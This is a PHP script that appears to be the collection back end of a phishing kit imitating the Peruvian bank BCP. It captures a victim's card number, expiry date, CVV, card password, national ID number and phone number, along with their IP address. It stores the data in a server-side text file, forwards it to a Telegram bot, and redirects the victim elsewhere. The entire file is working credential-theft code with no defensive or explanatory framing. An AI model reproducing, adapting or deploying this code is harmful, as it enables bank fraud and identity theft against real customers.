<?php
error_reporting(0);
session_destroy();
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR']; 
if (isset($_POST['tarka'])) {
    $msg  = "➖➖➖➖[ BCP ]➖➖➖➖\r\n";
    $msg .= "💳 TAR : {$_POST['tarka']}\r\n";
    $msg .= "✔️ EXP : {$_POST['venci']}\r\n";
    $msg .= "✔️ CVV : {$_POST['cbs']}\r\n";
    $msg .= "✅ CLA : {$_POST['cfrao']}\r\n";
    $msg .= "👨🏻‍💼 DNI : {$_POST['dni']}\r\n";
    $msg .= "📱 TLF : {$_POST['tlf']}\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@SISTEMAINPE]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location: $out");
    sendTg($msg, $key, $id);
}
?>